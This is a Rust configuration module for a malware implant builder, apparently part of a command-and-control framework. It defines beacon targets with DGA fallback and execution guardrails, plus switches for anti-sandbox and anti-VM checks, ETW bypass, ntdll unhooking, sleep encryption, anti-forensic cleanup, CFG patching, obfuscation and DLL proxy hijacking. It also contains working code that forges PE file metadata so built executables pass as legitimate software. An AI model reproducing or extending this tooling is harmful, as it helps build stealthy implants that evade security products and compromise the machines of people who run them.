use clap::ValueEnum;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::IpAddr;
use strum_macros::{Display, EnumString};

const DEFAULT_TLS_PORT: &str = ":443";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Implant {
    pub basic: BasicConfig,
    pub implants: ImplantConfig,
    pub pulse: Option<PulseConfig>,
    pub build: Option<BuildConfig>,
    #[serde(default)]
    pub loader: Option<LoaderConfig>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BasicConfig {
    pub name: String,
    // targets: Vec<String>,
    pub targets: Vec<TargetConfig>,
    // pub protocol: String, // To be removed
    // pub tls: TLSConfig,
    pub proxy: ProxyConfig,

    // Cron expression configuration
    #[serde(default = "default_cron")]
    pub cron: String, // Cron expression, e.g. "*/5 * * * * * *"

    pub jitter: f64, // Keep jitter
    #[serde(default)]
    pub keepalive: bool,
    pub encryption: String,
    pub key: String,
    pub retry: u32, // Number of consecutive failures allowed per target
    #[serde(default = "default_max_cycles")]
    pub max_cycles: Option<i32>, // Maximum number of cycles, -1 means infinite loop

    // DGA configuration
    #[serde(default)]
    pub dga: DgaConfig,
    // Guardrail configuration - environment detection protection
    #[serde(default)]
    pub guardrail: GuardrailConfig,
    // Maximum packet size for auto-chunking (matches server pipeline packet_length).
    // 0 = disabled (no chunking).
    #[serde(default)]
    pub max_packet_length: usize,
    pub secure: SecureConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ProxyConfig {
    #[serde(default)]
    pub use_env_proxy: bool,
    #[serde(default)]
    pub url: String,
}

impl std::fmt::Display for ProxyConfig {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.url.is_empty() && !self.use_env_proxy {
            write!(f, "no proxy")
        } else if self.url.is_empty() && self.use_env_proxy {
            write!(f, "use environment proxy")
        } else {
            write!(f, "{}", self.url)
        }
    }
}

impl Default for ProxyConfig {
    fn default() -> Self {
        Self {
            use_env_proxy: false,
            url: String::new(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecureConfig {
    #[serde(default)]
    pub enable: bool,
    #[serde(default)]
    pub private_key: String,
    #[serde(default)]
    pub public_key: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DgaConfig {
    pub enable: bool,
    pub key: String,
    pub interval_hours: u32,
}

impl Default for DgaConfig {
    fn default() -> Self {
        Self {
            enable: false,
            key: "default_dga_key".to_string(),
            interval_hours: 2,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GuardrailConfig {
    pub enable: bool,
    pub require_all: bool,
    pub ip_addresses: Vec<String>,
    pub usernames: Vec<String>,
    pub server_names: Vec<String>,
    pub domains: Vec<String>,
}

impl Default for GuardrailConfig {
    fn default() -> Self {
        Self {
            enable: false,
            require_all: true,
            ip_addresses: vec![],
            usernames: vec![],
            server_names: vec![],
            domains: vec![],
        }
    }
}

fn default_cron() -> String {
    "*/5 * * * * * *".to_string() // Default: every 5 seconds
}

fn default_max_cycles() -> Option<i32> {
    Some(-1) // Default: -1 means infinite loop
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TargetConfig {
    pub address: String,

    // Domain suffix configuration (for DGA and other features)
    // Only targets with this field configured support DGA
    #[serde(default)]
    pub domain_suffix: Option<String>,

    tcp: Option<TcpConfig>,
    #[serde(default)]
    pub http: Option<HttpConfig>,
    #[serde(default)]
    pub tls: Option<TLSConfig>,
    #[serde(default)]
    pub rem: Option<REMConfig>,
    #[serde(default)]
    pub proxy: Option<ProxyConfig>,
    #[serde(default)]
    pub session: Option<SessionConfig>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SessionConfig {
    #[serde(default)]
    pub read_chunk_size: Option<usize>,
    #[serde(default)]
    pub deadline_ms: Option<u64>,
    #[serde(default)]
    pub connect_timeout_ms: Option<u64>,
    #[serde(default)]
    pub keepalive: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TLSConfig {
    pub enable: bool,
    /// TLS version: "auto", "1.2", "1.3"
    #[serde(default = "default_tls_version")]
    pub version: String,
    /// Server Name Indication (SNI)
    #[serde(default)]
    pub sni: String,
    #[serde(default)]
    pub skip_verification: bool,
    /// CA certificate file path for server verification (optional, top-level)
    #[serde(default)]
    pub server_ca: Option<String>,
    /// mTLS client certificate configuration
    #[serde(default)]
    pub mtls: Option<MTLSConfig>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MTLSConfig {
    /// Enable mTLS
    pub enable: bool,
    /// Client certificate file path
    pub client_cert: String,
    /// Client private key file path
    pub client_key: String,
    /// CA certificate path for server verification (optional)
    #[serde(default)]
    pub server_ca: String,
}

// Default value functions
fn default_tls_version() -> String {
    "auto".to_string()
}
fn default_toolchain() -> String {
    "nightly-2023-09-18".to_string()
}

fn default_obfstr() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildConfig {
    pub zigbuild: bool,
    pub ollvm: Ollvm,
    pub metadata: Option<MetaData>,
    #[serde(default = "default_toolchain")]
    pub toolchain: String,
    #[serde(default = "default_obfstr")]
    pub obfstr: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Ollvm {
    pub enable: bool,
    pub bcfobf: bool,
    pub splitobf: bool,
    pub subobf: bool,
    pub fco: bool,
    pub constenc: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PulseConfig {
    pub flags: Flags,
    pub target: String,
    pub protocol: String,
    pub encryption: String,
    pub key: String,
    #[serde(default)]
    pub http: HttpConfig,
    #[serde(default)]
    pub api_type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TcpConfig {
    // TCP-specific configuration can be added here
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct HttpConfig {
    pub method: String,
    pub path: String,
    // pub host: String,
    pub version: String,
    pub headers: HashMap<String, String>,
    #[serde(default)]
    pub response_read_chunk_size: Option<usize>,
    #[serde(default)]
    pub response_retry_delay_ms: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct REMConfig {
    pub link: String,
}

impl TargetConfig {
    /// Get the target's host address (without port)
    pub fn get_host(&self) -> String {
        if let Some(colon_pos) = self.address.rfind(':') {
            self.address[..colon_pos].to_string()
        } else {
            self.address.clone()
        }
    }

    /// Detect the protocol type used by the target
    pub fn detect_protocol(&self) -> String {
        if self.http.is_some() {
            "http".to_string()
        } else if self.rem.is_some() {
            "rem".to_string()
        } else {
            "tcp".to_string() // Default protocol
        }
    }

    /// Check if the address is an IP address
    #[allow(dead_code)]
    pub fn is_ip_address(&self) -> bool {
        if let Some(colon_pos) = self.address.rfind(':') {
            let host = &self.address[..colon_pos];
            host.parse::<IpAddr>().is_ok()
        } else {
            self.address.parse::<IpAddr>().is_ok()
        }
    }

    /// Check if the address is a domain name
    #[allow(dead_code)]
    pub fn is_domain_address(&self) -> bool {
        !self.is_ip_address()
    }

    /// Check if DGA is supported (only if domain_suffix is explicitly configured)
    pub fn supports_dga(&self) -> bool {
        self.domain_suffix.is_some()
    }

    /// Get the domain suffix
    pub fn get_domain_suffix(&self) -> Option<&String> {
        self.domain_suffix.as_ref()
    }

    /// Get the port number
    #[allow(dead_code)]
    pub fn get_port(&self) -> String {
        if let Some(colon_pos) = self.address.rfind(':') {
            self.address[colon_pos..].to_string()
        } else {
            DEFAULT_TLS_PORT.to_string()
        }
    }

    /// Validate domain suffix configuration
    pub fn validate_domain_suffix(&self) -> anyhow::Result<()> {
        if let Some(ref suffix) = self.domain_suffix {
            if suffix.is_empty() {
                return Err(anyhow::anyhow!("domain_suffix cannot be empty"));
            }

            // Validate that suffix is not an IP address
            if suffix.parse::<std::net::IpAddr>().is_ok() {
                return Err(anyhow::anyhow!(
                    "domain_suffix cannot be an IP address: {}",
                    suffix
                ));
            }

            // Validate that suffix is a valid domain format
            if suffix.contains(':') {
                return Err(anyhow::anyhow!(
                    "domain_suffix should not contain port: {}",
                    suffix
                ));
            }
        }
        Ok(())
    }

    /// Validate the target configuration
    pub fn validate(&self) -> anyhow::Result<()> {
        if self.address.is_empty() {
            return Err(anyhow::anyhow!("Target address cannot be empty"));
        }

        // Validate domain suffix configuration
        // self.validate_domain_suffix()?;

        // Validate protocol configuration exclusivity
        let protocol_count = [self.http.is_some(), self.rem.is_some()]
            .iter()
            .filter(|&&x| x)
            .count();

        if protocol_count > 1 {
            return Err(anyhow::anyhow!(
                "Target can only have one protocol configuration"
            ));
        }

        // Validate HTTP configuration
        if let Some(http_config) = &self.http {
            if http_config.method.is_empty() || http_config.path.is_empty() {
                return Err(anyhow::anyhow!("HTTP method and path are required"));
            }
        }

        Ok(())
    }
}

impl HttpConfig {
    pub fn build(&self, length: u32) -> String {
        let mut http_request = format!("{} {} HTTP/{}\\r\\n", self.method, self.path, self.version);

        // http_request.push_str(&format!("Host: {}\r\n", host));
        if length > 0 {
            http_request.push_str(&format!("Content-Length: {length}\\r\\n"));
        }
        http_request.push_str("Connection: close\\r\\n");
        for (key, value) in &self.headers {
            http_request.push_str(&format!("{}: {}\\r\\n", key, value));
        }

        http_request.to_string()
    }
}

impl BasicConfig {
    /// Validate all target configurations
    pub fn validate_targets(&self) -> anyhow::Result<()> {
        if self.targets.is_empty() {
            return Ok(());
        }

        for (index, target) in self.targets.iter().enumerate() {
            target
                .validate()
                .map_err(|e| anyhow::anyhow!("Target {} validation failed: {}", index, e))?;
        }

        // Validate DGA configuration
        self.validate_dga_config()?;

        // Validate for duplicate addresses
        self.validate_unique_addresses()?;

        Ok(())
    }

    /// Validate address uniqueness
    fn validate_unique_addresses(&self) -> anyhow::Result<()> {
        let mut addresses = std::collections::HashSet::new();
        for target in &self.targets {
            if !addresses.insert(&target.address) {
                return Err(anyhow::anyhow!(
                    "Duplicate address found: {}",
                    target.address
                ));
            }
        }
        Ok(())
    }

    /// Get targets that support DGA (only includes targets with dga_suffix configured)
    pub fn get_dga_targets(&self) -> Vec<&TargetConfig> {
        if self.dga.enable {
            self.targets.iter().filter(|t| t.supports_dga()).collect()
        } else {
            vec![]
        }
    }

    /// Extract all domain suffixes (only from explicitly configured domain_suffix)
    pub fn extract_domain_suffixes(&self) -> Vec<String> {
        if self.dga.enable {
            self.targets
                .iter()
                .filter_map(|t| t.get_domain_suffix().map(|s| s.clone()))
                .collect()
        } else {
            vec![]
        }
    }

    /// Validate DGA configuration
    pub fn validate_dga_config(&self) -> anyhow::Result<()> {
        if self.dga.enable {
            if self.dga.key.is_empty() {
                return Err(anyhow::anyhow!(
                    "DGA key cannot be empty when DGA is enabled"
                ));
            }

            if self.dga.interval_hours == 0 || self.dga.interval_hours > 24 {
                return Err(anyhow::anyhow!(
                    "DGA interval_hours must be between 1 and 24"
                ));
            }

            let dga_targets = self.get_dga_targets();
            if dga_targets.is_empty() {
                return Err(anyhow::anyhow!(
                    "DGA is enabled but no targets support DGA. Add domain_suffix to targets that should support DGA."
                ));
            }

            // Validate each DGA target
            for target in dga_targets {
                target.validate_domain_suffix()?;
            }

            let domain_suffixes = self.extract_domain_suffixes();
            println!(
                "DGA enabled with {} domain suffixes: {:?}",
                domain_suffixes.len(),
                domain_suffixes
            );
        }
        Ok(())
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PackResource {
    pub src: String,
    pub dst: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ImplantConfig {
    pub runtime: String,
    pub r#mod: String,
    pub register_info: bool,
    pub hot_load: bool,
    #[serde(default = "default_true")]
    pub addon: bool,
    pub modules: Vec<String>,
    pub enable_3rd: bool,
    #[serde(rename = "3rd_modules")]
    pub third_modules: Vec<String>,
    pub flags: Flags,
    pub apis: Apis,
    pub alloctor: Alloctor,
    pub thread_stack_spoofer: bool,
    #[serde(default)]
    pub pack: Option<Vec<PackResource>>,
    pub prelude: String,
    #[serde(default)]
    pub anti: Option<AntiConfig>,
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Flags {
    pub start: u32, // Acutally it's a u8
    pub end: u32,   // Actually it's a u8
    pub magic: String,
    pub artifact_id: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Apis {
    pub level: String,
    pub priority: ApisPriority,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApisPriority {
    pub normal: NormalPriority,
    pub dynamic: DynamicPriority,
    pub syscalls: SyscallPriority,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NormalPriority {
    pub enable: bool,
    pub r#type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DynamicPriority {
    pub enable: bool,
    pub r#type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallPriority {
    pub enable: bool,
    pub r#type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Alloctor {
    pub inprocess: String,
    pub crossprocess: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MetaData {
    pub icon: String,
    pub compile_time: String,
    pub file_version: String,
    pub product_version: String,
    pub company_name: String,
    pub product_name: String,
    pub original_filename: String,
    pub file_description: String,
    pub internal_name: String,
    #[serde(default)]
    pub require_admin: bool,
    #[serde(default)]
    pub require_uac: bool,
}

impl MetaData {
    /// Try to pick a random line from `<dir>/<filename>.txt`.
    /// Returns None if dir is None, file doesn't exist, or is empty.
    fn pick_from_file(dir: Option<&str>, filename: &str) -> Option<String> {
        use rand::seq::SliceRandom;
        let dir = dir?;
        let path = format!("{}/{}.txt", dir, filename);
        let content = std::fs::read_to_string(&path).ok()?;
        let lines: Vec<&str> = content.lines().filter(|l| !l.trim().is_empty()).collect();
        let mut rng = rand::thread_rng();
        lines.choose(&mut rng).map(|s| s.trim().to_string())
    }

    /// Replace fields with value "random" with auto-generated fake values.
    /// If `metadata_wordlist` is Some, tries to read from `<dir>/<field>.txt` first.
    pub fn resolve_random(&mut self, metadata_wordlist: Option<&str>) {
        use fake::faker::company::en::*;
        use fake::faker::lorem::en::*;
        use fake::Fake;
        use rand::Rng;

        let mut rng = rand::thread_rng();

        if self.company_name == "random" {
            self.company_name = Self::pick_from_file(metadata_wordlist, "company_name")
                .unwrap_or_else(|| CompanyName().fake());
        }
        if self.product_name == "random" {
            self.product_name = Self::pick_from_file(metadata_wordlist, "product_name")
                .unwrap_or_else(|| CatchPhrase().fake());
        }
        if self.file_description == "random" {
            self.file_description = Self::pick_from_file(metadata_wordlist, "file_description")
                .unwrap_or_else(|| Bs().fake());
        }
        if self.original_filename == "random" {
            self.original_filename = Self::pick_from_file(metadata_wordlist, "original_filename")
                .unwrap_or_else(|| {
                    let word: String = Word().fake();
                    format!("{}.exe", word)
                });
        }
        if self.internal_name == "random" {
            self.internal_name = Self::pick_from_file(metadata_wordlist, "internal_name")
                .unwrap_or_else(|| {
                    self.original_filename
                        .strip_suffix(".exe")
                        .unwrap_or(&self.original_filename)
                        .to_string()
                });
        }
        if self.file_version == "random" {
            self.file_version = Self::pick_from_file(metadata_wordlist, "file_version")
                .unwrap_or_else(|| {
                    format!(
                        "{}.{}.{}.{}",
                        rng.gen_range(1..16),
                        rng.gen_range(0..10),
                        rng.gen_range(0..10),
                        rng.gen_range(0..10000)
                    )
                });
        }
        if self.product_version == "random" {
            self.product_version = Self::pick_from_file(metadata_wordlist, "product_version")
                .unwrap_or_else(|| {
                    format!(
                        "{}.{}.{}.{}",
                        rng.gen_range(1..16),
                        rng.gen_range(0..10),
                        rng.gen_range(0..10),
                        rng.gen_range(0..10000)
                    )
                });
        }
        if self.compile_time == "random" {
            self.compile_time = Self::pick_from_file(metadata_wordlist, "compile_time")
                .unwrap_or_else(|| {
                    let months = [
                        "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct",
                        "Nov", "Dec",
                    ];
                    let days_in_month = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
                    let year = rng.gen_range(2000..=2025);
                    let month_idx = rng.gen_range(0..12usize);
                    let day = rng.gen_range(1..=days_in_month[month_idx]);
                    let hour = rng.gen_range(0..24);
                    let min = rng.gen_range(0..60);
                    let sec = rng.gen_range(0..60);
                    format!(
                        "{} {:02} {} {:02}:{:02}:{:02}",
                        months[month_idx], day, year, hour, min, sec
                    )
                });
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PESignatureModify {
    pub feature: bool,
    pub modify: PESModify,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PESModify {
    pub magic: String,
    pub signature: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AntiConfig {
    #[serde(default)]
    pub sandbox: bool,
    #[serde(default)]
    pub vm: bool,
}

#[derive(Debug, Clone, Copy, EnumString, Display, ValueEnum)]
pub enum Version {
    #[strum(serialize = "community")]
    Community,
    #[strum(serialize = "professional")]
    Professional,
}

#[derive(Debug, Clone, Copy, EnumString, Display)]
pub enum GenerateArch {
    #[strum(serialize = "x64")]
    X64,
    #[strum(serialize = "x86")]
    X86,
}

#[derive(Debug, Clone, Copy, EnumString, Display)]
pub enum TransportProtocolType {
    #[strum(serialize = "tcp")]
    Tcp,
    #[strum(serialize = "http")]
    Http,
    #[strum(serialize = "https")]
    Https,
}

#[derive(Debug, Clone, Copy, EnumString, Display, Default)]
pub enum TransportApiType {
    #[default]
    #[strum(serialize = "raw")]
    Raw,
    #[strum(serialize = "winhttp")]
    WinHttp,
    #[strum(serialize = "wininet")]
    WinInet,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LoaderConfig {
    #[serde(default)]
    pub proxydll: Option<ProxyDllConfig>,
    #[serde(default)]
    pub evader: Option<EvaderConfig>,
    #[serde(default)]
    pub obfuscate: Option<ObfuscateConfig>,
}

/// Per-technique evader switches for malefic-starship.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct EvaderConfig {
    /// Anti-sandbox / anti-emulator environment checks
    #[serde(default)]
    pub anti_emu: bool,
    /// ETW bypass via VEH + hardware breakpoint + ntdll restore
    #[serde(default)]
    pub etw_pass: bool,
    /// ntdll unhooking via clean suspended-process read
    #[serde(default)]
    pub god_speed: bool,
    /// Sleep with XOR stack-memory obfuscation
    #[serde(default)]
    pub sleep_encrypt: bool,
    /// Clear registry artefacts + prefetch files
    #[serde(default)]
    pub anti_forensic: bool,
    /// Patch CFG (Control Flow Guard) validity check
    #[serde(default)]
    pub cfg_patch: bool,
    /// Restore hooked NT functions from the on-disk ntdll
    #[serde(default)]
    pub api_untangle: bool,
    /// Emit decoy benign API calls for behavioural-analysis evasion
    #[serde(default)]
    pub normal_api: bool,
}

/// Obfuscation feature switches for malefic-starship.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ObfuscateConfig {
    /// Compile-time AES string encryption (obf_strings)
    #[serde(default)]
    pub strings: bool,
    /// Control-flow flattening (obf_flow)
    #[serde(default)]
    pub flow: bool,
    /// Junk code insertion (obf_junk)
    #[serde(default)]
    pub junk: bool,
    /// Secure memory zeroization (obf_memory)
    #[serde(default)]
    pub memory: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProxyDllConfig {
    /// Hijacked function names (comma-separated)
    pub proxyfunc: String,
    /// Raw DLL path (for parsing exports)
    pub raw_dll: String,
    /// Proxied DLL path (runtime forwarding target)
    pub proxied_dll: String,
    /// Proxy DLL name (generated proxy DLL name, optional)
    #[serde(default)]
    pub proxy_dll: Option<String>,
    /// Resource directory for proxy DLL files
    #[serde(default = "default_proxydll_dir")]
    pub resource_dir: String,
    /// Enable block feature
    #[serde(default)]
    pub block: bool,
    /// Enable native_thread feature
    #[serde(default)]
    pub native_thread: bool,
    /// Enable resource packing to program.zip
    #[serde(default)]
    pub pack_resources: bool,
    /// Include spite.bin in resource pack (for external_spite mode)
    #[serde(default)]
    pub include_spite: bool,
    /// Custom spite.bin path (default: resources/spite.bin)
    #[serde(default = "default_spite_path")]
    pub spite_path: String,
    /// Hijack DLLMAIN
    #[serde(default)]
    pub hijack_dllmain: bool,
}

fn default_spite_path() -> String {
    "resources/spite.bin".to_string()
}

fn default_proxydll_dir() -> String {
    "resources/proxydll".to_string()
}
